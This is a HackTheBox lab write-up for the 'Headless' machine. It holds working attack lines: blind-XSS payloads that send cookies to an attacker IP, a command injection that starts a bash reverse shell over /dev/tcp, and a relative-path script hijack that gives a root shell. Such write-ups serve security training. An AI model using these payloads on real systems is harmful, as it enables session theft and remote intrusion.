---
title: Headless HackTheBox
author: Saad
date: 2024-10-30 00:00:00 +0500
categories:
  - HackTheBox
  - Web Apps
tags:
  - blind-xss
  - xss
  - command-injection
  - script-hijackings
image: Headless.webp
media_subpath: /assets/img/headless-htb
---

## Box Info:
Headless is an Easy Linux box features a simple web application which is vulnerable to Blind-XSS, With a simple payload XSS in `Request header` can get admin cookie, which then can be used to authenticate, The admin dashboard is vulnerable to **Command Injection** which can be leveraged to get a shell on the box, User's mail reveals a script which **does not uses absolute path**, which can be leveraged to get a root shell

## Recon
### Nmap
I'll start off by running nmap to see what we are up against.

```console
[skido]➜ nmap -p- --min-rate=1000 10.129.233.92
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 13:01 EDT
Nmap scan report for 10.129.233.92
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 71.66 seconds

[skido]➜ nmap -p 22,5000 -sCV 10.129.233.92
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 13:06 EDT
Nmap scan report for 10.129.233.92
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 30 Oct 2024 12:06:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|          <SNIP>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.42 seconds
```
As usual `22` is running `OpenSSH` where `5000` is running `Werkzeug/2.2.2 Python/3.11.2`.

### Website Port 5000

Looking at the results of nmap, we can see that `Werkzeug` is running on port 5000 which is setting a cookie `is_admin`. The `HttpOnly` is set to false which makes it easier to steal the cookie.
Well website is down but when clicking `For Questions` leads us to `/support` which offers a contact form, but we can fuzz with ffuf to see if there is anything else.

```console
➜  ~ ffuf -u http://10.129.233.92:5000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.233.92:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 116ms]
dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 118ms]
```

![contact](contact.png)

Well we can try to send xss payload in the message field and test it, But sadly when trying to send XSS payload in the contact form, it flags our IP Address:

![flagged](flagged.png)

## Shell as dvir

### Exploiting XSS
But there is some interesting information it reveals, when the IP gets flagged, the browser information gets sent to Admin.
After testing for a while came to understand that `<`/`>` are blocked.
Since it displays everything about the browser info, Well when tried to inject something in `User-Agent` it also got displayed on the page.

![header](header.png)

When I tried injecting XSS payload into the `User-Agent` header (or whatever header) it', processes it:

![xss](poc.png)

Now that we have xss we can use a simple payload to steal the cookie of whoever is checking the reports.

```html
<script>document.location='http://10.10.10.10/?'+document.cookie</script>

OR

<script>var i=new Image(); i.src="http://10.10.10.10/?c="+document.cookie;</script>
```
And after some moment we have the cookie on our webserver.
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.78 - - [30/Oct/2024 14:59:09] "GET /?c=
10.129.233.92 - - [30/Oct/2024 14:59:59] "GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
```
```
ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```
### Dashboard
From the ffuf results saw that there is `/dashboard`, After updating the old cookie with the new one we just stole we have **Administrator Dashboard**, Where Admins can generate website health report.

![generate_report](report.png)

### Command Injection
clicking on the **Generate Report** doesn't show much, when looking at the request through burp, it's just sending date, it could be just executing the `date` in the OS to just test when I tried sending it like this `date=2023-09-15; id` it worked, now we have command injection. let's get a shell.
I'll use the simple bash reverse shell.

```
bash -c 'bash -i >& /dev/tcp/10.10.14.78/9001 0>&1'
```
But first we need to url-encode it.

```
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.78/9001+0>%261'
```

And we got a shell as user `dvir`.
```
➜  ~ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.78] from (UNKNOWN) [10.129.233.92] 60588
bash: cannot set terminal process group (1176): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ 
dvir@headless:~$ wc -c user.txt
33 user.txt
```
![Im_in_the_box](https://i.imgur.com/lWYk9IB.png)
## Shell as root

### Enumeration

There is only `root` & `dvir`.
```bash
dvir@headless:~$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
dvir:x:1000:1000:dvir,,,:/home/dvir:/bin/bash
dvir@headless:~$
```

`sudo -l` tells that `dvir` can run `syscheck` as root.

```bash
dvir@headless:~$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
``` 
### syscheck script
Also looked at `/var/mail/dvir` which provides information about the `syscheck` script.
```
Subject: Important Update: New System Check Script

Hello!

We have an important update regarding our server. In response to recent compatibility and crashing issues, we've introduced a new system check script.

What's special for you?
- You've been granted special privileges to use this script.
- It will help identify and resolve system issues more efficiently.
- It ensures that necessary updates are applied when needed.

Rest assured, this script is at your disposal and won't affect your regular use of the system.

If you have any questions or notice anything unusual, please don't hesitate to reach out to us. We're here to assist you with any concerns.

By the way, we're still waiting on you to create the database initialization script!
Best regards,
Headless
```

Now let's take a look at the `syscheck` script what it actually doing:
```bash
dvir@headless:/var/mail$ cat /usr/bin/syscheck
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

The script checks if the `root` is running it if not it exits, Then it takes the last modified time of `vmlinuz` from `/boot` and prints it with last modified time after that it prints the output of `df -h`, Then it takes the prints the output of `uptime`. Then via `pgrep` it looks for `initdb.sh` if it doesn't finds it, it runs `./initdb.sh` otherwise it prints.

```
dvir@headless:/var/mail$ sudo syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.00, 0.01, 0.00
Database service is not running. Starting it...
```
So the thing here is that it doesn't uses an abouslute for `initdb.sh` which means it's running from the directory where you running the `syscheck` script.

### Exploiting the script

Now that we know it runs `./initdb.sh` from the working directory we are in. I'll make a simple `initdb.sh` in some writeable directory such as `/dev/shm`, make it executable & run `sudo syscheck`.

```bash
dvir@headless:/dev/shm$ echo "bash" > initdb.sh
dvir@headless:/dev/shm$ chmod +x initdb.sh
dvir@headless:/dev/shm$ sudo syscheck
sudo syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.00, 0.00, 0.00
Database service is not running. Starting it...
id
uid=0(root) gid=0(root) groups=0(root)
```

![gifo](https://media.tenor.com/R1TfzmBHEC0AAAAe/hacker-im.png)

Now grab the root.txt and Enjoy!
```bash
root@headless:/dev/shm# cd /root && wc -c root.txt
33 root.txt
```

Thanks for reading, Have a great day.

![PEPE](https://media.tenor.com/anVMFFvkDG0AAAAe/pepe-hacker.png)
